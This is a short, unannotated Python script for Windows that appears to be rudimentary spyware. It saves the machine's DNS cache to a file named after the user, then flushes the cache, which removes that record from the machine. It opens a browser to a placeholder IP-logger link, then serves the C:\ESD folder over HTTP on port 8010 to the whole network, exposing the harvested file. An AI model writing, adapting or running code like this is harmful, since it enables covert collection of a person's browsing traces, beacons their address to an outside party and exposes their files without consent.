import webbrowser as wb
import http.server
import socket
import socketserver
import os

os.system('@echo off && ipconfig /displaydns > %USERNAME%.txt')
os.system('@echo off && ipconfig /flushdns')

PORT = 8010

os.chdir('C:\ESD')

wb.open_new('iplogger here')

Handler = http.server.SimpleHTTPRequestHandler
hostname = socket.gethostname()
 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
IP = "http://" + s.getsockname()[0] + ":" + str(PORT)
link = IP

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
